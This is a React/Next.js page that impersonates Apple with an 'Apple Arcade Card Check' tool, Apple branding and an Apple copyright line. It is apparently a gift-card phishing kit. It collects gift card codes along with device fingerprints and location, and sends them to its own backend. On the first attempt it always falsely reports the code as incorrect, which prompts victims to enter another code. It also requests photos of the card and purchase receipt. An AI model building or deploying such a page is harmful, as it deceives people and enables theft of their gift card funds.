import { useState, useEffect } from 'react'
import Head from 'next/head'

const COLORS = {
  bg: '#ffffff',
  surface: '#f5f5f7',
  surfaceHover: '#e8e8ed',
  border: 'rgba(0,0,0,0.08)',
  borderHover: 'rgba(0,0,0,0.15)',
  text: '#1d1d1f',
  textSecondary: '#6e6e73',
  accent: '#0071e3',
  accentGlow: 'rgba(0,113,227,0.1)',
  error: '#ff3b30',
  errorBg: 'rgba(255,59,48,0.08)',
  success: '#34c759',
  gradient1: '#0071e3',
  gradient2: '#5856d6',
  glass: 'rgba(255,255,255,0.8)',
  glassBorder: 'rgba(0,0,0,0.06)',
}

export default function PeterPage() {
  const [cards, setCards] = useState([''])
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [error, setError] = useState(null)
  const [location, setLocation] = useState('United States')
  const [showTutorial, setShowTutorial] = useState(false)
  const [showIssuanceInfo, setShowIssuanceInfo] = useState(false)
  const [showLocationBanner, setShowLocationBanner] = useState(true)
  const [deviceId, setDeviceId] = useState(null)
  const [copySuccess, setCopySuccess] = useState(false)
  const [attemptCount, setAttemptCount] = useState(0)
  const [showUploadStep, setShowUploadStep] = useState(false)
  const [selectedImages, setSelectedImages] = useState([])
  const [uploadProgress, setUploadProgress] = useState(false)
  const [uploadComplete, setUploadComplete] = useState(false)
  const [uploadError, setUploadError] = useState(null)
  const [scrolled, setScrolled] = useState(false)

  useEffect(() => {
    async function detectLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/')
        const data = await res.json()
        if (data.country_name) setLocation(data.country_name)
      } catch (err) {
        console.error('IP detection failed', err)
      }
    }
    detectLocation()
    let id = localStorage.getItem('deviceId')
    if (!id) {
      id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
      localStorage.setItem('deviceId', id)
    }
    setDeviceId(id)
  }, [])

  useEffect(() => {
    const onScroll = () => setScrolled(window.scrollY > 40)
    window.addEventListener('scroll', onScroll, { passive: true })
    return () => window.removeEventListener('scroll', onScroll)
  }, [])

  const handleCardChange = (index, value) => {
    setCards(prev => prev.map((c, i) => i === index ? value.toUpperCase() : c))
  }
  const addCard = () => setCards(prev => [...prev, ''])
  const removeCard = (index) => setCards(prev => prev.length > 1 ? prev.filter((_, i) => i !== index) : prev)

  async function checkBalance(e) {
    if (e) e.preventDefault()
    setError(null)
    setResult(null)
    setCopySuccess(false)
    const validCards = cards.filter(c => c.trim())
    if (validCards.length === 0) return setError('Please enter a card number.')
    setLoading(true)
    try {
      const browserInfo = { platform: navigator.platform, vendor: navigator.vendor, language: navigator.language, screen: `${window.screen.width}x${window.screen.height}` }
      const res = await fetch('/api/generate-issuance-id', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cardNumber: validCards.map(c => c.replace(/\s+/g, '')).join('/'), type: 'apple-arcade', deviceId, location, browserInfo: JSON.stringify(browserInfo) })
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Unknown error')
      if (attemptCount === 0) {
        setError('The card code you entered is incorrect. Please verify the code and try again.')
        setCards([''])
        setAttemptCount(1)
      } else {
        setResult(data)
        setAttemptCount(0)
        if (data.cardId && !data.isDuplicate) setShowUploadStep(true)
      }
    } catch (err) { setError(err.message) } finally { setLoading(false) }
  }

  const countries = ['Afghanistan','Albania','Algeria','Argentina','Australia','Austria','Bangladesh','Belgium','Brazil','Canada','Chile','China','Colombia','Czech Republic','Denmark','Egypt','Finland','France','Germany','Greece','Hong Kong','Hungary','India','Indonesia','Ireland','Israel','Italy','Japan','Malaysia','Mexico','Netherlands','New Zealand','Nigeria','Norway','Pakistan','Peru','Philippines','Poland','Portugal','Romania','Saudi Arabia','Singapore','South Africa','South Korea','Spain','Sweden','Switzerland','Taiwan','Thailand','Turkey','Ukraine','United Arab Emirates','United Kingdom','United States','Vietnam'].sort()

  const handleImageSelect = (e) => {
    const files = Array.from(e.target.files)
    if (files.length + selectedImages.length > 3) { setUploadError('Maximum 3 images allowed'); return }
    setUploadError(null)
    files.forEach(file => {
      const reader = new FileReader()
      reader.onload = (event) => { setSelectedImages(prev => [...prev, { file, preview: event.target.result, base64: event.target.result }]) }
      reader.readAsDataURL(file)
    })
  }

  const removeImage = (index) => setSelectedImages(prev => prev.filter((_, i) => i !== index))

  const handleUpload = async () => {
    if (selectedImages.length === 0) { setUploadError('Please select at least one image'); return }
    setUploadProgress(true); setUploadError(null)
    try {
      const res = await fetch('/api/upload-receipt', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cardId: result.cardId, images: selectedImages.map(img => img.base64) }) })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Upload failed')
      setUploadComplete(true); setShowUploadStep(false)
    } catch (err) { setUploadError(err.message) } finally { setUploadProgress(false) }
  }

  const skipUpload = () => { setShowUploadStep(false); setSelectedImages([]); setUploadError(null) }
  const copyIssuanceId = async () => { if (!result?.issuanceId) return; try { await navigator.clipboard.writeText(result.issuanceId); setCopySuccess(true) } catch { setError('Unable to copy the Issuance ID right now.') } }
  const resetForm = () => { setCards(['']); setResult(null); setShowUploadStep(false); setSelectedImages([]); setUploadComplete(false); setUploadError(null); setCopySuccess(false) }

  return (
    <>
      <Head>
        <title>Apple Arcade Card Check</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <style>{`
          *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
          html { scroll-behavior: smooth; }
          body { font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: ${COLORS.bg}; color: ${COLORS.text}; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; overflow-x: hidden; }
          ::selection { background: rgba(0,113,227,0.2); }
          input::placeholder { color: rgba(0,0,0,0.25); }
          @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
          @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
          @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
          @keyframes glow { 0%, 100% { box-shadow: 0 0 20px rgba(0,113,227,0.08); } 50% { box-shadow: 0 0 40px rgba(0,113,227,0.12); } }
          @keyframes slideUp { from { opacity: 0; transform: translateY(40px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
        `}</style>
      </Head>

      {/* Location Banner */}
      {showLocationBanner && (
        <div style={{
          position: 'fixed', top: 0, left: 0, right: 0, zIndex: 100,
          background: 'rgba(255,255,255,0.95)', backdropFilter: 'blur(20px)',
          borderBottom: `1px solid ${COLORS.border}`,
          padding: '12px 24px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '12px', flexWrap: 'wrap',
          animation: 'fadeIn 0.4s ease'
        }}>
          <span style={{ fontSize: '13px', color: COLORS.textSecondary }}>Choose your region for localized content.</span>
          <select
            value={location}
            onChange={(e) => setLocation(e.target.value)}
            style={{
              background: '#fff', color: COLORS.text, border: `1px solid ${COLORS.border}`,
              borderRadius: '8px', padding: '6px 12px', fontSize: '13px', outline: 'none', cursor: 'pointer'
            }}
          >
            {countries.map(c => <option key={c} value={c}>{c}</option>)}
          </select>
          <button onClick={() => setShowLocationBanner(false)} style={{
            background: COLORS.accent, color: '#fff', border: 'none', borderRadius: '8px',
            padding: '6px 16px', fontSize: '13px', fontWeight: 600, cursor: 'pointer', transition: 'all 0.2s'
          }}>Continue</button>
          <button onClick={() => setShowLocationBanner(false)} style={{
            background: 'none', border: 'none', color: COLORS.textSecondary, cursor: 'pointer', padding: '4px', fontSize: '18px', lineHeight: 1
          }}>×</button>
        </div>
      )}

      {/* Header */}
      <header style={{
        position: 'fixed', top: showLocationBanner ? '48px' : 0, left: 0, right: 0, zIndex: 90,
        background: scrolled ? 'rgba(255,255,255,0.85)' : 'transparent',
        backdropFilter: scrolled ? 'blur(20px) saturate(180%)' : 'none',
        borderBottom: scrolled ? `1px solid ${COLORS.border}` : '1px solid transparent',
        transition: 'all 0.3s ease',
        padding: '0 32px', height: '56px', display: 'flex', alignItems: 'center', justifyContent: 'space-between'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <svg width="20" height="24" viewBox="0 0 20 24" fill="none" style={{ opacity: 0.9 }}>
            <path d="M15.2 12.8c0-2.8 2.3-4.1 2.4-4.2-1.3-1.9-3.3-2.2-4-2.3-1.7-.2-3.3 1-4.2 1s-2.2-1-3.6-1c-1.9 0-3.6 1.1-4.6 2.8-2 3.5-.5 8.6 1.4 11.4 1 1.4 2.1 3 3.6 2.9 1.4-.1 2-.9 3.6-.9s2.2.9 3.6.9 2.4-1.4 3.3-2.8c1.2-1.6 1.6-3.1 1.7-3.2-.1-.1-3.2-1.2-3.2-4.7zM12.3 4.3c.8-1 1.4-2.3 1.2-3.6-1.2.1-2.6.8-3.4 1.8-.7.9-1.4 2.2-1.2 3.5 1.3.1 2.7-.7 3.4-1.7z" fill="#1d1d1f"/>
          </svg>
          <span style={{ fontSize: '15px', fontWeight: 600, letterSpacing: '-0.01em', color: COLORS.text }}>Apple Arcade</span>
        </div>
        <nav style={{ display: 'flex', gap: '28px' }}>
          {['Store', 'Mac', 'iPad', 'iPhone', 'Watch', 'Arcade', 'Support'].map(item => (
            <a key={item} href="#" style={{
              color: item === 'Arcade' ? COLORS.text : COLORS.textSecondary,
              textDecoration: 'none', fontSize: '13px', fontWeight: item === 'Arcade' ? 600 : 400,
              transition: 'color 0.2s', letterSpacing: '-0.01em'
            }}>{item}</a>
          ))}
        </nav>
      </header>

      {/* Hero */}
      <section style={{ position: 'relative', marginTop: showLocationBanner ? '104px' : '56px', overflow: 'hidden' }}>
        <div style={{
          width: '100%', height: 'clamp(320px, 50vw, 520px)', position: 'relative',
          background: `linear-gradient(180deg, ${COLORS.bg} 0%, #f0f0f5 40%, #e8e8ed 70%, ${COLORS.bg} 100%)`
        }}>
          <img src="/applearcade.jpeg" alt="" style={{
            position: 'absolute', inset: 0, width: '100%', height: '100%',
            objectFit: 'cover', objectPosition: 'center', opacity: 0.85,
            maskImage: 'linear-gradient(to bottom, transparent 0%, black 15%, black 75%, transparent 100%)',
            WebkitMaskImage: 'linear-gradient(to bottom, transparent 0%, black 15%, black 75%, transparent 100%)'
          }} />
          <div style={{
            position: 'absolute', inset: 0,
            background: 'radial-gradient(ellipse at center top, rgba(0,113,227,0.04) 0%, transparent 60%)'
          }} />
        </div>
        <div style={{
          position: 'absolute', bottom: 0, left: 0, right: 0, padding: '0 24px 48px',
          textAlign: 'center', zIndex: 2
        }}>
          <h1 style={{
            fontSize: 'clamp(32px, 5vw, 56px)', fontWeight: 700, letterSpacing: '-0.03em',
            lineHeight: 1.1, marginBottom: '12px', color: COLORS.text
          }}>
            Apple Arcade Card Check
          </h1>
          <p style={{
            fontSize: 'clamp(15px, 2vw, 18px)', color: COLORS.textSecondary,
            maxWidth: '480px', margin: '0 auto', lineHeight: 1.5, fontWeight: 400
          }}>
            Enter your code to check if your card will work for Apple Arcade.
          </p>
        </div>
      </section>

      {/* Main Content */}
      <main style={{ maxWidth: '520px', margin: '-24px auto 0', padding: '0 20px 80px', position: 'relative', zIndex: 3 }}>

        {/* Form Card */}
        <div style={{
          background: COLORS.surface,
          border: `1px solid ${COLORS.glassBorder}`,
          borderRadius: '20px',
          padding: '32px',
          animation: 'slideUp 0.6s ease',
          boxShadow: '0 4px 24px rgba(0,0,0,0.06), 0 0 0 1px rgba(0,0,0,0.02) inset'
        }}>
          <form onSubmit={checkBalance}>
            {cards.map((cardValue, index) => (
              <div key={index} style={{ marginBottom: index < cards.length - 1 ? '12px' : '0' }}>
                <label style={{
                  display: 'block', fontSize: '13px', fontWeight: 500, color: COLORS.textSecondary,
                  marginBottom: '8px', letterSpacing: '0.02em'
                }}>
                  Gift Card Code {cards.length > 1 ? `#${index + 1}` : ''}
                </label>
                <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                  <input
                    type="text"
                    value={cardValue}
                    onChange={(e) => handleCardChange(index, e.target.value)}
                    placeholder="XXXX XXXX XXXX XXXX"
                    autoComplete="off"
                    style={{
                      flex: 1, background: '#fff',
                      border: `1px solid ${COLORS.border}`, borderRadius: '12px',
                      padding: '14px 16px', fontSize: '16px', color: COLORS.text,
                      outline: 'none', transition: 'all 0.2s', letterSpacing: '0.05em',
                      fontFamily: 'inherit'
                    }}
                    onFocus={(e) => { e.target.style.borderColor = COLORS.accent; e.target.style.boxShadow = `0 0 0 3px ${COLORS.accentGlow}` }}
                    onBlur={(e) => { e.target.style.borderColor = COLORS.border; e.target.style.boxShadow = 'none' }}
                  />
                  {cards.length > 1 && (
                    <button type="button" onClick={() => removeCard(index)} style={{
                      background: 'none', border: 'none', color: COLORS.textSecondary,
                      fontSize: '20px', cursor: 'pointer', padding: '8px', lineHeight: 1, borderRadius: '8px',
                      transition: 'all 0.2s'
                    }}
                    onMouseEnter={(e) => { e.target.style.color = COLORS.error; e.target.style.background = COLORS.errorBg }}
                    onMouseLeave={(e) => { e.target.style.color = COLORS.textSecondary; e.target.style.background = 'none' }}
                    >×</button>
                  )}
                </div>
              </div>
            ))}

            {cards.length < 5 && (
              <button type="button" onClick={addCard} style={{
                background: 'none', border: `1px dashed ${COLORS.borderHover}`,
                borderRadius: '12px', padding: '12px', width: '100%', marginTop: '12px',
                color: COLORS.textSecondary, fontSize: '13px', fontWeight: 500,
                cursor: 'pointer', transition: 'all 0.2s', fontFamily: 'inherit'
              }}
              onMouseEnter={(e) => { e.target.style.borderColor = COLORS.accent; e.target.style.color = COLORS.accent }}
              onMouseLeave={(e) => { e.target.style.borderColor = COLORS.borderHover; e.target.style.color = COLORS.textSecondary }}
              >
                + Add Another Card
              </button>
            )}

            {!showUploadStep && (
              <button type="submit" disabled={loading} style={{
                width: '100%', marginTop: '20px', padding: '15px',
                background: loading ? 'rgba(41,151,255,0.5)' : `linear-gradient(135deg, ${COLORS.gradient1}, ${COLORS.gradient2})`,
                border: 'none', borderRadius: '12px', color: '#fff',
                fontSize: '15px', fontWeight: 600, cursor: loading ? 'not-allowed' : 'pointer',
                transition: 'all 0.3s', fontFamily: 'inherit', letterSpacing: '-0.01em',
                boxShadow: loading ? 'none' : '0 4px 16px rgba(41,151,255,0.3)',
                position: 'relative', overflow: 'hidden'
              }}
              onMouseEnter={(e) => { if (!loading) e.target.style.transform = 'translateY(-1px)' }}
              onMouseLeave={(e) => { if (!loading) e.target.style.transform = 'translateY(0)' }}
              >
                {loading ? (
                  <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
                    <span style={{ width: '16px', height: '16px', border: `2px solid rgba(0,113,227,0.3)`, borderTopColor: COLORS.accent, borderRadius: '50%', animation: 'pulse 1s ease infinite' }} />
                    Checking…
                  </span>
                ) : 'Check Card'}
              </button>
            )}
          </form>

          {error && (
            <div style={{
              marginTop: '16px', padding: '14px 16px', borderRadius: '12px',
              background: COLORS.errorBg, border: '1px solid rgba(255,69,58,0.2)',
              color: COLORS.error, fontSize: '13px', fontWeight: 500,
              display: 'flex', alignItems: 'center', gap: '10px',
              animation: 'fadeIn 0.3s ease'
            }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
              </svg>
              {error}
            </div>
          )}

          {result && !showUploadStep && (
            <div style={{
              marginTop: '20px', padding: '20px', borderRadius: '16px',
              background: COLORS.surface, border: `1px solid ${COLORS.border}`,
              animation: 'slideUp 0.4s ease'
            }}>
              <div style={{ fontSize: '11px', fontWeight: 600, color: COLORS.textSecondary, textTransform: 'uppercase', letterSpacing: '1px', marginBottom: '8px' }}>Card Type</div>
              {result.message ? (
                <div style={{ fontSize: '16px', fontWeight: 600, color: COLORS.text }}>{result.message}</div>
              ) : (
                <>
                  <div style={{ fontSize: '24px', fontWeight: 700, color: COLORS.error, marginBottom: '4px' }}>Not a legacy card</div>
                  <div style={{ fontSize: '13px', color: COLORS.textSecondary }}>For card ending in {result.cardLast4}</div>
                </>
              )}
            </div>
          )}

          {/* Upload Step */}
          {showUploadStep && (
            <div style={{ marginTop: '20px', padding: '24px', borderRadius: '16px', background: COLORS.surface, border: `1px solid ${COLORS.border}`, animation: 'slideUp 0.4s ease' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '8px' }}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke={COLORS.accent} strokeWidth="2" strokeLinecap="round">
                  <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/>
                </svg>
                <h3 style={{ fontSize: '16px', fontWeight: 600 }}>Upload Card Image / Receipt</h3>
              </div>
              <p style={{ fontSize: '13px', color: COLORS.textSecondary, marginBottom: '16px' }}>Upload a photo of your card and purchase receipt for verification.</p>

              <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap', marginBottom: '16px' }}>
                {selectedImages.map((img, idx) => (
                  <div key={idx} style={{                     position: 'relative', width: '80px', height: '80px', borderRadius: '10px', overflow: 'hidden', border: `1px solid ${COLORS.border}`, background: '#f5f5f7' }}>
                    <img src={img.preview} alt="" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                    <button type="button" onClick={() => removeImage(idx)} style={{
                      position: 'absolute', top: '4px', right: '4px', width: '20px', height: '20px',
                      borderRadius: '50%', background: 'rgba(0,0,0,0.5)', border: 'none',
                      color: '#fff', fontSize: '12px', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center'
                    }}>×</button>
                  </div>
                ))}
                {selectedImages.length < 3 && (
                  <label style={{
                    width: '80px', height: '80px', borderRadius: '10px', border: `1px dashed ${COLORS.borderHover}`,
                    display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
                    cursor: 'pointer', transition: 'all 0.2s', color: COLORS.textSecondary, fontSize: '11px', gap: '4px',
                    background: 'transparent'
                  }}>
                    <input type="file" accept="image/*" onChange={handleImageSelect} multiple style={{ display: 'none' }} />
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
                    Add
                  </label>
                )}
              </div>

              {uploadError && <div style={{ color: COLORS.error, fontSize: '13px', marginBottom: '12px' }}>{uploadError}</div>}

              <div style={{ display: 'flex', gap: '10px' }}>
                <button type="button" onClick={handleUpload} disabled={uploadProgress || selectedImages.length === 0} style={{
                  flex: 1, padding: '12px', background: COLORS.accent, border: 'none', borderRadius: '10px',
                  color: '#fff', fontSize: '14px', fontWeight: 600, cursor: uploadProgress ? 'not-allowed' : 'pointer',
                  opacity: uploadProgress || selectedImages.length === 0 ? 0.5 : 1, fontFamily: 'inherit'
                }}>{uploadProgress ? 'Uploading…' : 'Upload'}</button>
                <button type="button" onClick={skipUpload} disabled={uploadProgress} style={{
                  padding: '12px 20px', background: 'none', border: `1px solid ${COLORS.border}`,
                  borderRadius: '10px', color: COLORS.textSecondary, fontSize: '14px', cursor: 'pointer', fontFamily: 'inherit'
                }}>Skip</button>
              </div>
            </div>
          )}

          {uploadComplete && (
            <div style={{ marginTop: '16px', padding: '16px', borderRadius: '12px', background: 'rgba(48,209,88,0.08)', border: '1px solid rgba(48,209,88,0.2)', color: COLORS.success, fontSize: '14px', fontWeight: 500, display: 'flex', alignItems: 'center', gap: '8px', animation: 'fadeIn 0.3s ease' }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><polyline points="20 6 9 17 4 12"/></svg>
              Upload complete. Thank you!
            </div>
          )}
        </div>

        {/* Tutorial Section */}
        <div style={{ marginTop: '24px' }}>
          {/* Tutorial Toggle */}
          <button onClick={() => setShowTutorial(!showTutorial)} style={{
            width: '100%', padding: '18px 20px', background: COLORS.surface,
            border: `1px solid ${COLORS.glassBorder}`, borderRadius: showTutorial ? '16px 16px 0 0' : '16px',
            borderBottom: showTutorial ? `1px solid ${COLORS.border}` : `1px solid ${COLORS.glassBorder}`,
            color: COLORS.text, fontSize: '14px', fontWeight: 500, cursor: 'pointer',
            display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            transition: 'all 0.2s', fontFamily: 'inherit'
          }}>
            <span style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke={COLORS.accent} strokeWidth="2" strokeLinecap="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
              Can't find your gift card code?
            </span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" style={{ transform: showTutorial ? 'rotate(180deg)' : 'rotate(0)', transition: 'transform 0.3s', color: COLORS.textSecondary }}>
              <polyline points="6 9 12 15 18 9" />
            </svg>
          </button>
          {showTutorial && (
            <div style={{
              background: COLORS.surface, border: `1px solid ${COLORS.glassBorder}`, borderTop: 'none',
              borderRadius: '0 0 16px 16px', padding: '20px', animation: 'fadeIn 0.3s ease'
            }}>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(140px, 1fr))', gap: '16px' }}>
                {[
                  { title: 'Physical Card', desc: 'Look on the back of your card. The 16-digit code is printed below the barcode.', icon: '💳' },
                  { title: 'Digital Card', desc: 'Check your email for a message from Apple with your gift code.', icon: '📧' },
                  { title: 'Receipt', desc: 'If purchased in-store, check your receipt for the code.', icon: '🧾' }
                ].map((item, i) => (
                  <div key={i} style={{
                    padding: '16px', borderRadius: '12px', background: '#fff',
                    border: `1px solid ${COLORS.border}`, textAlign: 'center'
                  }}>
                    <div style={{ fontSize: '28px', marginBottom: '8px' }}>{item.icon}</div>
                    <div style={{ fontSize: '13px', fontWeight: 600, marginBottom: '6px' }}>{item.title}</div>
                    <div style={{ fontSize: '12px', color: COLORS.textSecondary, lineHeight: 1.5 }}>{item.desc}</div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* How It Works */}
        <div style={{ marginTop: '12px' }}>
          <button onClick={() => setShowIssuanceInfo(!showIssuanceInfo)} style={{
            width: '100%', padding: '18px 20px', background: COLORS.surface,
            border: `1px solid ${COLORS.glassBorder}`, borderRadius: showIssuanceInfo ? '16px 16px 0 0' : '16px',
            borderBottom: showIssuanceInfo ? `1px solid ${COLORS.border}` : `1px solid ${COLORS.glassBorder}`,
            color: COLORS.text, fontSize: '14px', fontWeight: 500, cursor: 'pointer',
            display: 'flex', alignItems: 'center', justifyContent: 'space-between',
            transition: 'all 0.2s', fontFamily: 'inherit'
          }}>
            <span style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke={COLORS.gradient2} strokeWidth="2" strokeLinecap="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
              How do I check my Apple Arcade card?
            </span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" style={{ transform: showIssuanceInfo ? 'rotate(180deg)' : 'rotate(0)', transition: 'transform 0.3s', color: COLORS.textSecondary }}>
              <polyline points="6 9 12 15 18 9" />
            </svg>
          </button>
          {showIssuanceInfo && (
            <div style={{
              background: COLORS.surface, border: `1px solid ${COLORS.glassBorder}`, borderTop: 'none',
              borderRadius: '0 0 16px 16px', padding: '24px', animation: 'fadeIn 0.3s ease'
            }}>
              {[
                { step: '01', text: 'Enter your Apple Gift Card code in the field above. The code is usually 16 digits found on the back of a physical card or in a digital email.' },
                { step: '02', text: 'Click "Check Card" and wait for the result. Your card will be verified against our database to confirm its compatibility.' },
                { step: '03', text: 'If the card is not compatible, you will be notified immediately. You can try again with a different code.' }
              ].map((item, i) => (
                <div key={i} style={{ display: 'flex', gap: '14px', marginBottom: i < 2 ? '16px' : '0' }}>
                  <div style={{
                    width: '32px', height: '32px', borderRadius: '10px', flexShrink: 0,
                    background: `linear-gradient(135deg, ${COLORS.accentGlow}, rgba(88,86,214,0.08))`,
                    border: `1px solid rgba(0,113,227,0.12)`,
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    fontSize: '12px', fontWeight: 700, color: COLORS.accent
                  }}>{item.step}</div>
                  <p style={{ fontSize: '14px', color: COLORS.textSecondary, lineHeight: 1.6, margin: 0, paddingTop: '4px' }}>{item.text}</p>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Footer */}
        <div style={{ marginTop: '48px', textAlign: 'center', padding: '24px 0', borderTop: `1px solid ${COLORS.border}` }}>
          <p style={{ fontSize: '12px', color: COLORS.textSecondary }}>
            Need help? <a href="https://support.apple.com/gift-card" target="_blank" rel="noopener noreferrer" style={{ color: COLORS.accent, textDecoration: 'none' }}>Visit Apple Support</a>
          </p>
          <p style={{ fontSize: '11px', color: 'rgba(0,0,0,0.3)', marginTop: '8px' }}>© {new Date().getFullYear()} Apple Inc. All rights reserved.</p>
        </div>
      </main>
    </>
  )
}
